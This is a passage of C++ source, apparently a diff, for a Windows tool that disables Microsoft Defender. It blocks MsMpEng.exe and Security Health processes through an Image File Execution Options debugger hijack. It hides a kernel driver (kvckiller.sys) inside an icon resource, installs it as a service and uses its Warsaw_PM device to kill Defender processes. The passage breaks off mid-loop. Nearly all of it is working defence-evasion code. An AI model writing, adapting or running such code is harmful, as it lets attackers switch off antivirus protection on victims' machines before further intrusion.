+    std::wcout << L"  WinDefCtl tp off                      # Disable Tamper Protection\n";
+    std::wcout << L"  WinDefCtl tp on                       # Re-enable Tamper Protection\n";
+    
+    PrintFooter();
+}
+
+```
+
+`src/BannerUtils.h`:
+
+```h
+#pragma once
+
+#include <windows.h>
+#include <string_view>
+
+namespace BannerUtils {
+    inline constexpr int WIDTH = 80;
+    inline constexpr std::wstring_view BORDER_DOUBLE = 
+        L"================================================================================";
+    inline constexpr std::wstring_view BORDER_SINGLE =
+        L"+------------------------------------------------------------------------------+";
+    
+    namespace Colors {
+        inline constexpr WORD BLUE_BRIGHT = FOREGROUND_BLUE | FOREGROUND_INTENSITY;
+        inline constexpr WORD WHITE_BRIGHT = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY;
+        inline constexpr WORD YELLOW_BRIGHT = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
+        inline constexpr WORD GREEN_BRIGHT = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
+        inline constexpr WORD GRAY = FOREGROUND_INTENSITY;
+    }
+    
+    void ShowBanner() noexcept;
+    void ShowUsage() noexcept;
+    
+    void PrintCentered(std::wstring_view text, HANDLE hConsole, WORD color) noexcept;
+    void PrintBoxLine(std::wstring_view text, HANDLE hConsole, WORD borderColor, WORD textColor) noexcept;
+    void PrintSectionHeader(const wchar_t* title) noexcept;
+    void PrintCommandLine(const wchar_t* command, const wchar_t* description) noexcept;
+    void PrintFooter() noexcept;
+}
+
+```
+
+`src/DefenderManager.cpp`:
+
+```cpp
+#include "DefenderManager.h"
+
+#include <windows.h>
+#include <tlhelp32.h>
+#include <filesystem>
+#include <iostream>
+
+namespace fs = std::filesystem;
+
+// ============================================================================
+// LOCAL HELPERS
+// ============================================================================
+
+static bool EnablePrivilege(LPCWSTR privilege) noexcept
+{
+    HANDLE hToken = nullptr;
+    if (!OpenProcessToken(GetCurrentProcess(),
+                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return false;
+    TOKEN_PRIVILEGES tp{};
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    bool ok = LookupPrivilegeValueW(nullptr, privilege, &tp.Privileges[0].Luid) &&
+              AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr) &&
+              GetLastError() != ERROR_NOT_ALL_ASSIGNED;
+    CloseHandle(hToken);
+    return ok;
+}
+
+static std::wstring GetTempDir() noexcept
+{
+    wchar_t buf[MAX_PATH];
+    DWORD len = GetTempPathW(MAX_PATH, buf);
+    if (!len) return L"C:\\Windows\\Temp";
+    std::wstring p = buf;
+    if (!p.empty() && p.back() == L'\\') p.pop_back();
+    return p;
+}
+
+// ============================================================================
+// PUBLIC INTERFACE
+// ============================================================================
+
+bool DefenderManager::DisableSecurityEngine() noexcept
+{
+    std::wcout << L"[*] Adding IFEO block for MsMpEng.exe...\n";
+
+    if (!EnableRequiredPrivileges()) {
+        std::wcout << L"[!] Failed to enable SE_BACKUP_NAME/SE_RESTORE_NAME\n";
+        return false;
+    }
+
+    HiveContext ctx;
+    if (!CreateIFEOSnapshot(ctx)) {
+        std::wcout << L"[!] Failed to create IFEO hive snapshot\n";
+        return false;
+    }
+    if (!ModifyMsMpEngIFEO(ctx, true)) {
+        std::wcout << L"[!] Failed to set Debugger value in temp hive\n";
+        return false;
+    }
+    if (!RestoreIFEOSnapshot(ctx)) {
+        std::wcout << L"[!] Failed to restore IFEO hive\n";
+        return false;
+    }
+
+    std::wcout << L"[+] IFEO block set\n";
+    return true;
+}
+
+bool DefenderManager::EnableSecurityEngine() noexcept
+{
+    std::wcout << L"[*] Removing IFEO block for MsMpEng.exe...\n";
+
+    if (!EnableRequiredPrivileges()) {
+        std::wcout << L"[!] Failed to enable SE_BACKUP_NAME/SE_RESTORE_NAME\n";
+        return false;
+    }
+
+    HiveContext ctx;
+    if (!CreateIFEOSnapshot(ctx)) {
+        std::wcout << L"[!] Failed to create IFEO hive snapshot\n";
+        return false;
+    }
+    if (!ModifyMsMpEngIFEO(ctx, false)) {
+        std::wcout << L"[!] Failed to remove Debugger value from temp hive\n";
+        return false;
+    }
+    if (!RestoreIFEOSnapshot(ctx)) {
+        std::wcout << L"[!] Failed to restore IFEO hive\n";
+        return false;
+    }
+
+    std::wcout << L"[+] IFEO block removed\n";
+
+    std::wcout << L"[*] Starting WinDefend service...\n";
+    if (StartWinDefend()) {
+        std::wcout << L"[+] WinDefend started\n";
+    } else {
+        std::wcout << L"[-] WinDefend could not be started\n";
+    }
+
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (hSCM) {
+        SC_HANDLE hHealth = OpenServiceW(hSCM, L"SecurityHealthService", SERVICE_START);
+        if (hHealth) {
+            if (StartServiceW(hHealth, 0, nullptr) ||
+                GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
+                std::wcout << L"[+] SecurityHealthService started\n";
+            else
+                std::wcout << L"[-] SecurityHealthService could not be started\n";
+            CloseServiceHandle(hHealth);
+        }
+        CloseServiceHandle(hSCM);
+    }
+
+    STARTUPINFOW si{};
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi{};
+    if (CreateProcessW(L"C:\\Windows\\System32\\SecurityHealthSystray.exe",
+                       nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
+        std::wcout << L"[+] SecurityHealthSystray.exe launched\n";
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+
+    return true;
+}
+
+// ============================================================================
+// STATUS
+// ============================================================================
+
+DefenderManager::DefenderStatus DefenderManager::QueryStatus() noexcept
+{
+    DefenderStatus s{};
+    s.state            = SecurityState::UNKNOWN;
+    s.ifeoBlocked      = false;
+    s.winDefendRunning = false;
+    s.msmpengRunning   = false;
+
+    HKEY hKey = nullptr;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, MSMPENG_SUBKEY,
+                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t buf[MAX_PATH] = {};
+        DWORD sz   = sizeof(buf);
+        DWORD type = 0;
+        if (RegQueryValueExW(hKey, DEBUGGER_VALUE, nullptr, &type,
+                             reinterpret_cast<LPBYTE>(buf), &sz) == ERROR_SUCCESS
+            && type == REG_SZ) {
+            s.ifeoBlocked  = true;
+            s.ifeoDebugger = buf;
+        }
+        RegCloseKey(hKey);
+    }
+
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (hSCM) {
+        SC_HANDLE hSvc = OpenServiceW(hSCM, WINDEFEND_SVC, SERVICE_QUERY_STATUS);
+        if (hSvc) {
+            SERVICE_STATUS ss{};
+            if (QueryServiceStatus(hSvc, &ss)) {
+                s.winDefendRunning = (ss.dwCurrentState == SERVICE_RUNNING);
+                if (ss.dwCurrentState == SERVICE_RUNNING && !s.ifeoBlocked)
+                    s.state = SecurityState::ACTIVE;
+                else if (s.ifeoBlocked)
+                    s.state = SecurityState::IFEO_BLOCKED;
+                else
+                    s.state = SecurityState::INACTIVE;
+            }
+            CloseServiceHandle(hSvc);
+        } else {
+            s.state = (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
+                      ? SecurityState::NOT_INSTALLED
+                      : SecurityState::UNKNOWN;
+        }
+        CloseServiceHandle(hSCM);
+    }
+
+    s.msmpengRunning = IsMsMpEngRunning();
+    if (s.ifeoBlocked) s.state = SecurityState::IFEO_BLOCKED;
+
+    return s;
+}
+
+DefenderManager::SecurityState DefenderManager::GetSecurityEngineStatus() noexcept
+{
+    return QueryStatus().state;
+}
+
+// ============================================================================
+// PRIVATE — HIVE OPERATIONS
+// ============================================================================
+
+bool DefenderManager::EnableRequiredPrivileges() noexcept
+{
+    return EnablePrivilege(SE_BACKUP_NAME) &&
+           EnablePrivilege(SE_RESTORE_NAME);
+}
+
+bool DefenderManager::CreateIFEOSnapshot(HiveContext& ctx) noexcept
+{
+    ctx.tempPath = GetTempDir();
+    if (ctx.tempPath.empty()) return false;
+
+    ctx.hiveFile = ctx.tempPath + L"\\Ifeo.hiv";
+
+    if (fs::exists(ctx.hiveFile))
+        DeleteFileW(ctx.hiveFile.c_str());
+
+    HKEY hCheck = nullptr;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME,
+                      0, KEY_READ, &hCheck) == ERROR_SUCCESS) {
+        RegCloseKey(hCheck);
+        RegUnLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME);
+    }
+
+    HKEY hIfeo = nullptr;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, IFEO_KEY,
+                      0, KEY_READ, &hIfeo) != ERROR_SUCCESS) {
+        std::wcout << L"[!] Cannot open IFEO registry key\n";
+        return false;
+    }
+
+    LONG r = RegSaveKeyExW(hIfeo, ctx.hiveFile.c_str(), nullptr, REG_LATEST_FORMAT);
+    RegCloseKey(hIfeo);
+    if (r != ERROR_SUCCESS) {
+        std::wcout << L"[!] RegSaveKeyEx failed: " << r << L"\n";
+        return false;
+    }
+
+    if (RegLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME,
+                    ctx.hiveFile.c_str()) != ERROR_SUCCESS) {
+        std::wcout << L"[!] RegLoadKey failed\n";
+        return false;
+    }
+
+    return true;
+}
+
+bool DefenderManager::ModifyMsMpEngIFEO(const HiveContext& /*ctx*/, bool addBlock) noexcept
+{
+    static constexpr const wchar_t* targets[] = {
+        L"MsMpEng.exe",
+        L"SecurityHealthSystray.exe",
+        L"SecurityHealthService.exe"
+    };
+
+    for (size_t i = 0; i < 3; ++i) {
+        const std::wstring keyPath = std::wstring(TEMP_HIVE_NAME) + L"\\" + targets[i];
+        const bool required = (i == 0);
+
+        if (addBlock) {
+            HKEY hKey = nullptr;
+            LONG r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
+                                     0, nullptr, REG_OPTION_NON_VOLATILE,
+                                     KEY_WRITE, nullptr, &hKey, nullptr);
+            if (r != ERROR_SUCCESS) {
+                if (required) {
+                    std::wcout << L"[!] RegCreateKeyEx on TempIFEO\\" << targets[i]
+                               << L" failed: " << r << L"\n";
+                    return false;
+                }
+                continue;
+            }
+            const DWORD sz = static_cast<DWORD>((wcslen(DEBUGGER_PAYLOAD) + 1) * sizeof(wchar_t));
+            r = RegSetValueExW(hKey, DEBUGGER_VALUE, 0, REG_SZ,
+                               reinterpret_cast<const BYTE*>(DEBUGGER_PAYLOAD), sz);
+            RegCloseKey(hKey);
+            if (r != ERROR_SUCCESS && required) {
+                std::wcout << L"[!] RegSetValueEx Debugger failed: " << r << L"\n";
+                return false;
+            }
+        } else {
+            HKEY hKey = nullptr;
+            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
+                              0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+                RegDeleteValueW(hKey, DEBUGGER_VALUE);
+                RegCloseKey(hKey);
+            }
+            RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
+        }
+    }
+
+    return true;
+}
+
+bool DefenderManager::RestoreIFEOSnapshot(const HiveContext& ctx) noexcept
+{
+    if (RegUnLoadKeyW(HKEY_LOCAL_MACHINE, TEMP_HIVE_NAME) != ERROR_SUCCESS)
+        std::wcout << L"[!] Warning: RegUnLoadKey(TempIFEO) failed\n";
+
+    HKEY hIfeo = nullptr;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, IFEO_KEY,
+                      0, KEY_WRITE, &hIfeo) != ERROR_SUCCESS) {
+        std::wcout << L"[!] Cannot open IFEO key for restore\n";
+        return false;
+    }
+
+    LONG r = RegRestoreKeyW(hIfeo, ctx.hiveFile.c_str(), REG_FORCE_RESTORE);
+    RegCloseKey(hIfeo);
+    if (r != ERROR_SUCCESS) {
+        std::wcout << L"[!] RegRestoreKey failed: " << r << L"\n";
+        return false;
+    }
+
+    return true;
+}
+
+// ============================================================================
+// PRIVATE — SERVICE & PROCESS HELPERS
+// ============================================================================
+
+bool DefenderManager::StartWinDefend() noexcept
+{
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (!hSCM) return false;
+
+    SC_HANDLE hSvc = OpenServiceW(hSCM, WINDEFEND_SVC,
+                                  SERVICE_START | SERVICE_QUERY_STATUS);
+    if (!hSvc) {
+        CloseServiceHandle(hSCM);
+        return false;
+    }
+
+    bool ok = StartServiceW(hSvc, 0, nullptr)
+           || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;
+
+    CloseServiceHandle(hSvc);
+    CloseServiceHandle(hSCM);
+    return ok;
+}
+
+bool DefenderManager::IsMsMpEngRunning() noexcept
+{
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return false;
+
+    PROCESSENTRY32W pe{ sizeof(pe) };
+    bool found = false;
+    if (Process32FirstW(hSnap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, L"MsMpEng.exe") == 0) {
+                found = true;
+                break;
+            }
+        } while (Process32NextW(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    return found;
+}
+
+bool DefenderManager::IsWinDefendRunning() noexcept
+{
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (!hSCM) return false;
+
+    SC_HANDLE hSvc = OpenServiceW(hSCM, WINDEFEND_SVC, SERVICE_QUERY_STATUS);
+    if (!hSvc) { CloseServiceHandle(hSCM); return false; }
+
+    SERVICE_STATUS ss{};
+    bool running = QueryServiceStatus(hSvc, &ss)
+                && ss.dwCurrentState == SERVICE_RUNNING;
+
+    CloseServiceHandle(hSvc);
+    CloseServiceHandle(hSCM);
+    return running;
+}
+
+// ============================================================================
+// HIVE CONTEXT CLEANUP
+// ============================================================================
+
+void DefenderManager::HiveContext::Cleanup() noexcept
+{
+    if (hiveFile.empty()) return;
+
+    for (const auto& path : {
+            hiveFile,
+            hiveFile + L".LOG1",
+            hiveFile + L".LOG2",
+            hiveFile + L".blf" }) {
+        DeleteFileW(path.c_str());
+    }
+
+    try {
+        const fs::path hiveDir  = fs::path(hiveFile).parent_path();
+        const std::wstring base = fs::path(hiveFile).filename().wstring();
+        for (const auto& entry : fs::directory_iterator(hiveDir)) {
+            const std::wstring fname = entry.path().filename().wstring();
+            if (fname.size() > base.size() &&
+                _wcsnicmp(fname.c_str(), base.c_str(), base.size()) == 0 &&
+                fname[base.size()] == L'{') {
+                DeleteFileW(entry.path().c_str());
+            }
+        }
+    } catch (...) {}
+}
+
+```
+
+`src/DefenderManager.h`:
+
+```h
+#pragma once
+
+#include <windows.h>
+#include <string>
+
+class DefenderManager {
+public:
+    enum class SecurityState {
+        ACTIVE,
+        IFEO_BLOCKED,
+        INACTIVE,
+        NOT_INSTALLED,
+        UNKNOWN
+    };
+
+    struct DefenderStatus {
+        SecurityState state;
+        bool          ifeoBlocked;
+        bool          winDefendRunning;
+        bool          msmpengRunning;
+        std::wstring  ifeoDebugger;
+    };
+
+    static bool DisableSecurityEngine() noexcept;
+    static bool EnableSecurityEngine()  noexcept;
+    static DefenderStatus QueryStatus() noexcept;
+    static SecurityState  GetSecurityEngineStatus() noexcept;
+
+private:
+    struct HiveContext {
+        std::wstring tempPath;
+        std::wstring hiveFile;
+
+        HiveContext()  = default;
+        ~HiveContext() { Cleanup(); }
+        HiveContext(const HiveContext&)            = delete;
+        HiveContext& operator=(const HiveContext&) = delete;
+        HiveContext(HiveContext&&)                 = default;
+        HiveContext& operator=(HiveContext&&)      = default;
+
+        void Cleanup() noexcept;
+    };
+
+    static bool EnableRequiredPrivileges() noexcept;
+    static bool CreateIFEOSnapshot(HiveContext& ctx) noexcept;
+    static bool ModifyMsMpEngIFEO(const HiveContext& ctx, bool addBlock) noexcept;
+    static bool RestoreIFEOSnapshot(const HiveContext& ctx) noexcept;
+    static bool StartWinDefend() noexcept;
+    static bool IsMsMpEngRunning() noexcept;
+    static bool IsWinDefendRunning() noexcept;
+
+    static constexpr const wchar_t* IFEO_KEY =
+        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options";
+    static constexpr const wchar_t* MSMPENG_SUBKEY =
+        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\MsMpEng.exe";
+    static constexpr const wchar_t* TEMP_HIVE_NAME   = L"TempIFEO";
+    static constexpr const wchar_t* DEBUGGER_VALUE   = L"Debugger";
+    static constexpr const wchar_t* DEBUGGER_PAYLOAD = L"systray.exe";
+    static constexpr const wchar_t* WINDEFEND_SVC    = L"WinDefend";
+};
+
+```
+
+`src/DriverExtract.cpp`:
+
+```cpp
+#include "DriverExtract.h"
+#include "GenIconSize.h"
+#include "Resource.h"
+
+#include <windows.h>
+#include <fdi.h>
+#include <iostream>
+
+#pragma comment(lib, "Cabinet.lib")
+
+// ============================================================================
+// FDI IN-MEMORY STATE
+// ============================================================================
+
+static struct {
+    const BYTE* cabPtr;
+    SIZE_T      cabOff;
+    SIZE_T      cabEnd;
+    BYTE*       outPtr;
+    SIZE_T      outUsed;
+    SIZE_T      outCap;
+} g_fdi;
+
+static wchar_t g_driverPath[MAX_PATH];
+
+// ============================================================================
+// FDI CALLBACKS
+// ============================================================================
+
+static LPVOID DIAMONDAPI fdi_alloc(ULONG cb)
+{
+    return HeapAlloc(GetProcessHeap(), 0, cb);
+}
+
+static void DIAMONDAPI fdi_free(LPVOID pv)
+{
+    HeapFree(GetProcessHeap(), 0, pv);
+}
+
+static INT_PTR DIAMONDAPI fdi_open(char* /*pszFile*/, int /*oflag*/, int /*pmode*/)
+{
+    return 1;   // fake file handle — data comes from g_fdi.cabPtr
+}
+
+static UINT DIAMONDAPI fdi_read(INT_PTR /*hf*/, void* pv, UINT cb)
+{
+    SIZE_T avail = g_fdi.cabEnd - g_fdi.cabOff;
+    if (cb > (UINT)avail) cb = (UINT)avail;
+    if (cb > 0) {
+        memcpy(pv, g_fdi.cabPtr + g_fdi.cabOff, cb);
+        g_fdi.cabOff += cb;
+    }
+    return cb;
+}
+
+static UINT DIAMONDAPI fdi_write(INT_PTR /*hf*/, void* pv, UINT cb)
+{
+    if (g_fdi.outUsed + cb > g_fdi.outCap) return 0;
+    memcpy(g_fdi.outPtr + g_fdi.outUsed, pv, cb);
+    g_fdi.outUsed += cb;
+    return cb;
+}
+
+static int DIAMONDAPI fdi_close(INT_PTR /*hf*/)
+{
+    return 0;
+}
+
+static long DIAMONDAPI fdi_seek(INT_PTR /*hf*/, long dist, int seektype)
+{
+    long newPos;
+    if (seektype == SEEK_SET)
+        newPos = dist;
+    else if (seektype == SEEK_CUR)
+        newPos = (long)g_fdi.cabOff + dist;
+    else
+        newPos = (long)g_fdi.cabEnd + dist;
+
+    if (newPos < 0) newPos = 0;
+    if ((SIZE_T)newPos > g_fdi.cabEnd) newPos = (long)g_fdi.cabEnd;
+    g_fdi.cabOff = (SIZE_T)newPos;
+    return newPos;
+}
+
+static INT_PTR DIAMONDAPI fdi_notify(FDINOTIFICATIONTYPE fdint, PFDINOTIFICATION /*pfdin*/)
+{
+    if (fdint == fdintCOPY_FILE)       return 1;
+    if (fdint == fdintCLOSE_FILE_INFO) return TRUE;
+    return 0;
+}
+
+// ============================================================================
+// DECOMPRESS FROM RESOURCE
+// ============================================================================
+
+static bool DecompressFromResource() noexcept
+{
+    HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(IDR_DRIVER), RT_RCDATA);
+    if (!hRes) {
+        std::wcout << L"[!] IDR_DRIVER resource not found\n";
+        return false;
+    }
+
+    DWORD totalSize = SizeofResource(nullptr, hRes);
+    if (totalSize <= ICON_HEADER_SIZE + 4) {
+        std::wcout << L"[!] Resource too small (no CAB payload)\n";
+        return false;
+    }
+
+    HGLOBAL hGlob = LoadResource(nullptr, hRes);
+    if (!hGlob) return false;
+
+    const BYTE* raw = reinterpret_cast<const BYTE*>(LockResource(hGlob));
+    if (!raw) return false;
+
+    SIZE_T cabSize = totalSize - ICON_HEADER_SIZE;
+
+    static const SIZE_T kOutCap = 1024 * 1024;   // 1 MB — enough for any driver
+    BYTE* outBuf = reinterpret_cast<BYTE*>(HeapAlloc(GetProcessHeap(), 0, kOutCap));
+    if (!outBuf) return false;
+
+    g_fdi.cabPtr  = raw + ICON_HEADER_SIZE;
+    g_fdi.cabOff  = 0;
+    g_fdi.cabEnd  = cabSize;
+    g_fdi.outPtr  = outBuf;
+    g_fdi.outUsed = 0;
+    g_fdi.outCap  = kOutCap;
+
+    ERF erf{};
+    HFDI hfdi = FDICreate(fdi_alloc, fdi_free, fdi_open, fdi_read,
+                          fdi_write, fdi_close, fdi_seek, cpuUNKNOWN, &erf);
+    if (!hfdi) {
+        HeapFree(GetProcessHeap(), 0, outBuf);
+        return false;
+    }
+
+    // Cabinet name / path strings are irrelevant — we read from memory
+    BOOL ok = FDICopy(hfdi,
+                      const_cast<char*>("memory.cab"),
+                      const_cast<char*>(""),
+                      0, fdi_notify, nullptr, nullptr);
+
+    FDIDestroy(hfdi);
+
+    if (!ok || g_fdi.outUsed == 0) {
+        HeapFree(GetProcessHeap(), 0, outBuf);
+        std::wcout << L"[!] FDI decompression failed (erf=" << erf.erfOper << L")\n";
+        return false;
+    }
+
+    return true;
+}
+
+// ============================================================================
+// PUBLIC API
+// ============================================================================
+
+bool ExtractKillerDriver() noexcept
+{
+    if (!DecompressFromResource()) return false;
+
+    // Build destination path: %SystemRoot%\System32\drivers\kvckiller.sys
+    wchar_t winDir[MAX_PATH] = {};
+    GetSystemWindowsDirectoryW(winDir, MAX_PATH);
+    _snwprintf_s(g_driverPath, MAX_PATH, _TRUNCATE,
+                 L"%s\\System32\\drivers\\kvckiller.sys", winDir);
+
+    HANDLE hFile = CreateFileW(g_driverPath, GENERIC_WRITE, 0, nullptr,
+                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        std::wcout << L"[!] Cannot write " << g_driverPath
+                   << L" (err=" << GetLastError() << L")\n";
+        HeapFree(GetProcessHeap(), 0, g_fdi.outPtr);
+        g_fdi.outPtr  = nullptr;
+        g_fdi.outUsed = 0;
+        return false;
+    }
+
+    DWORD written    = 0;
+    DWORD toWrite    = static_cast<DWORD>(g_fdi.outUsed);
+    BOOL  writeOk    = WriteFile(hFile, g_fdi.outPtr, toWrite, &written, nullptr);
+    DWORD writeErr   = GetLastError();
+    CloseHandle(hFile);
+
+    HeapFree(GetProcessHeap(), 0, g_fdi.outPtr);
+    g_fdi.outPtr  = nullptr;
+    g_fdi.outUsed = 0;
+
+    if (!writeOk || written != toWrite) {
+        std::wcout << L"[!] WriteFile failed (err=" << writeErr << L")\n";
+        return false;
+    }
+
+    std::wcout << L"[+] kvckiller.sys extracted (" << written << L" B)\n";
+    return true;
+}
+
+const wchar_t* GetKillerDriverPath() noexcept
+{
+    if (g_driverPath[0]) return g_driverPath;
+
+    wchar_t winDir[MAX_PATH] = {};
+    GetSystemWindowsDirectoryW(winDir, MAX_PATH);
+    _snwprintf_s(g_driverPath, MAX_PATH, _TRUNCATE,
+                 L"%s\\System32\\drivers\\kvckiller.sys", winDir);
+    return g_driverPath;
+}
+
+```
+
+`src/DriverExtract.h`:
+
+```h
+#pragma once
+
+// Extract kvckiller.sys from embedded RCDATA resource (icon+CAB payload)
+// to %SystemRoot%\System32\drivers\kvckiller.sys
+bool ExtractKillerDriver() noexcept;
+
+// Returns path to extracted driver
+const wchar_t* GetKillerDriverPath() noexcept;
+
+```
+
+`src/GenIconSize.h`:
+
+```h
+// Auto-generated by build.ps1 — do not edit manually.
+// Byte count of IcoBuilder\WinDefCtl.ico; CAB payload begins at this offset.
+#pragma once
+#define ICON_HEADER_SIZE 9662
+```
+
+`src/KillerEngine.cpp`:
+
+```cpp
+#include "KillerEngine.h"
+
+#include <windows.h>
+#include <tlhelp32.h>
+#include <vector>
+#include <string>
+#include <iostream>
+
+static void StopAndDelete(SC_HANDLE hSvc) noexcept
+{
+    SERVICE_STATUS ss{};
+    ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
+
+    // Wait for SERVICE_STOPPED before DeleteService to avoid zombie entry
+    for (int i = 0; i < 50; ++i) {
+        if (!QueryServiceStatus(hSvc, &ss)) break;
+        if (ss.dwCurrentState == SERVICE_STOPPED) break;
+        Sleep(100);
+    }
+
+    DeleteService(hSvc);
+}
+
+static bool EnableLoadDriver() noexcept
+{
+    HANDLE hToken = nullptr;
+    if (!OpenProcessToken(GetCurrentProcess(),
+                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return false;
+    TOKEN_PRIVILEGES tp{};
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    bool ok = LookupPrivilegeValueW(nullptr, SE_LOAD_DRIVER_NAME, &tp.Privileges[0].Luid) &&
+              AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr) &&
+              GetLastError() != ERROR_NOT_ALL_ASSIGNED;
+    CloseHandle(hToken);
+    return ok;
+}
+
+// Resolve \SystemRoot\ or \??\C:\... style paths to absolute Win32 paths
+static std::wstring ResolveSystemPath(const std::wstring& path) noexcept
+{
+    if (path.size() >= 12 && _wcsnicmp(path.c_str(), L"\\SystemRoot\\", 12) == 0) {
+        wchar_t winDir[MAX_PATH] = {};
+        GetSystemWindowsDirectoryW(winDir, MAX_PATH);
+        return std::wstring(winDir) + path.substr(11);
+    }
+    if (path.size() >= 4 && path[0] == L'\\' && path[1] == L'?' &&
+        path[2] == L'?' && path[3] == L'\\')
+    {
+        return path.substr(4);
+    }
+    return path;
+}
+
+static std::wstring QueryServiceImagePath(SC_HANDLE hSvc) noexcept
+{
+    DWORD needed = 0;
+    QueryServiceConfigW(hSvc, nullptr, 0, &needed);
+    if (needed == 0) return {};
+
+    std::vector<BYTE> buf(needed);
+    auto* cfg = reinterpret_cast<QUERY_SERVICE_CONFIGW*>(buf.data());
+    if (!QueryServiceConfigW(hSvc, cfg, needed, &needed)) return {};
+    if (!cfg->lpBinaryPathName) return {};
+    return cfg->lpBinaryPathName;
+}
+
+// Check if an existing wsftprm service points to a valid kvckiller.sys
+static bool IsValidKillerService(SC_HANDLE hSvc) noexcept
+{
+    std::wstring raw = QueryServiceImagePath(hSvc);
+    if (raw.empty()) return false;
+
+    std::wstring resolved = ResolveSystemPath(raw);
+
+    // Basename must be kvckiller.sys (case-insensitive)
+    size_t slash = resolved.find_last_of(L"\\/");
+    std::wstring base = (slash == std::wstring::npos) ? resolved : resolved.substr(slash + 1);
+    if (_wcsicmp(base.c_str(), L"kvckiller.sys") != 0) return false;
+
+    // File must exist on disk
+    return GetFileAttributesW(resolved.c_str()) != INVALID_FILE_ATTRIBUTES;
+}
+
+bool KillerEngine::KillDefender(const wchar_t* killerSysPath) noexcept
+{
+    EnableLoadDriver();
+
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
+    if (!hSCM) {
+        std::wcout << L"[-] Cannot open SCM (err=" << GetLastError() << L")\n";
+        return false;
+    }
+
+    SC_HANDLE hSvc      = nullptr;
+    bool      ownService = false;
+    bool      killerLoaded = false;
+
+    // Check if wsftprm already exists
+    hSvc = OpenServiceW(hSCM, L"wsftprm",
+                        SERVICE_QUERY_CONFIG | SERVICE_START | SERVICE_STOP | DELETE);
+
+    if (hSvc) {
+        if (IsValidKillerService(hSvc)) {
+            std::wcout << L"[*] Reusing existing wsftprm service (kvckiller.sys valid)\n";
+            ownService = false;
+        } else {
+            // Invalid path — stop, delete, recreate
+            std::wcout << L"[*] wsftprm exists but path invalid — recreating\n";
+            StopAndDelete(hSvc);
+            CloseServiceHandle(hSvc);
+            hSvc = nullptr;
+        }
+    }
+
+    if (!hSvc) {
+        // Create fresh service pointing to the extracted driver
+        hSvc = CreateServiceW(hSCM, L"wsftprm", L"wsftprm",
+                              SERVICE_START | SERVICE_STOP | DELETE | SERVICE_QUERY_CONFIG,
+                              SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
+                              SERVICE_ERROR_NORMAL, killerSysPath,
+                              nullptr, nullptr, nullptr, nullptr, nullptr);
+        if (hSvc) {
+            ownService = true;
+        } else {
+            std::wcout << L"[-] CreateService wsftprm failed (err=" << GetLastError() << L")\n";
+            CloseServiceHandle(hSCM);
+            return false;
+        }
+    }
+
+    if (StartServiceW(hSvc, 0, nullptr) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
+        killerLoaded = true;
+    else
+        std::wcout << L"[-] StartService wsftprm failed (err=" << GetLastError() << L")\n";
+
+    if (killerLoaded) {
+        HANDLE hDev = CreateFileW(L"\\\\.\\Warsaw_PM",
+                                  GENERIC_READ | GENERIC_WRITE, 0, nullptr,
+                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hDev != INVALID_HANDLE_VALUE) {
+            static constexpr const wchar_t* killTargets[] = {
+                L"MsMpEng.exe", L"SecurityHealthSystray.exe"
+            };
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnap != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32W pe{ sizeof(pe) };
+                if (Process32FirstW(hSnap, &pe)) {
+                    do {
+                        for (const wchar_t* target : killTargets) {
+                            if (_wcsicmp(pe.szExeFile, target) == 0) {
